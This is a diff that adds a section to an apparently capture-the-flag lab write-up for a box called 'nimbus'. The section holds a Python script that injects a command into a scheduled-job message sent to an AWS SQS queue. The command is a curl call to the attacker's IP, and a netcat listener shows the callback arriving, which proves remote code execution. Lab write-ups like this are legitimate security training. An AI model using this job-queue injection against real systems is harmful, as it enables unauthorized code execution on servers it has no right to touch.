@@ -331,4 +331,56 @@ nimbus FAIL
 ╰─                                                                                                                   ─╯
 ```
 
+<img width="183" height="113" alt="imagen" src="https://github.com/user-attachments/assets/90e92935-57c9-4bea-b50c-fdb20934ecdf" />
+
+``` python
+
+import subprocess
+
+payload = "curl http://10.10.14.54:9090"
+script = f'import os;os.system("{payload}")'
+
+message_body = {
+    "name": "probe",
+    "schedule": "* * * * *",
+    "runtime": "python3.11",
+    "script": script
+}
+
+import json
+message_body_str = json.dumps(message_body)
+
+cmd = [
+    "aws", "sqs", "send-message",
+    "--queue-url", "http://aws.nimbus.htb/847219365028/nimbus-jobs",
+    "--message-body", message_body_str,
+    "--endpoint-url", "http://aws.nimbus.htb"
+]
+
+r = subprocess.run(cmd, capture_output=True, text=True)
+print(r.returncode, r.stdout, r.stderr)
+
+```
+
+``` bash
+
+❯ python3 rce.py
+0 {
+    "MD5OfMessageBody": "b5c3839ecc1dc01a164befd2f7bc5695",
+    "MessageId": "45d86c3b-ab46-497b-8cae-4f1f31d8b531"
+}
+```
+
+``` bash
+
+❯ nc -lvnp 9090
+listening on [any] 9090 ...
+connect to [10.10.14.54] from (UNKNOWN) [10.129.42.21] 42802
+GET / HTTP/1.1
+Host: 10.10.14.54:9090
+User-Agent: curl/8.14.1
+Accept: */*
+
+```
+
 
